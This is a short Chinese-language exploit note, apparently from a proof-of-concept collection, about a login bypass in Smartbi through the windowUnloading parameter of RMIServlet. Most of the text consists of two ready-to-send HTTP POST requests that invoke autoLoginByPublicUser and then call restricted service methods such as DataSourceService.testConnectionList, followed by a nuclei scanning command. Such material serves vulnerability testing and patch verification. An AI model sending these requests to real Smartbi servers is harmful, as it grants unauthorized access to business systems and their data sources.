
## Smartbi windowUnloading 绕过登录

### 参考
https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/

未使用windowUnloading前，调用受限方法会提示未登录，构造windowUnloading参数后
## POC

```
POST /smartbi/vision/RMIServlet?windowUnloading=className%3DUserService%26methodName%3DautoLoginByPublicUser%26params%3D%5B%5D HTTP/1.1
Host: 192.168.137.131:18080
Content-Length: 71
Cache-Control: max-age=0
If-Modified-Since: 0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://192.168.137.131:18080
Referer: http://192.168.137.131:18080/smartbi/vision/index.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: JSESSIONID=CEA21F9B9E23D9F15CC94B4B01718B5B
Connection: close

className=DataSourceService&methodName=testConnectionList&params=%5b%5d

```

## POC2
```
POST /smartbi/vision/RMIServlet?windowUnloading=&zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu7uNf7NfN1/u71'/NOJM/NOJN/uu/JT HTTP/1.1
Host: 1.1.1.1
User-Agent: Go-http-client/1.1
Content-Length: 52
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

className=UserService&methodName=isLogged&params=[]
```

## PoC nuclei
`smartbi-windowunloading-deserialization`

`nuclei -debug -tags smartbi -timeout 20 -pi -u https://x.x.x.129`
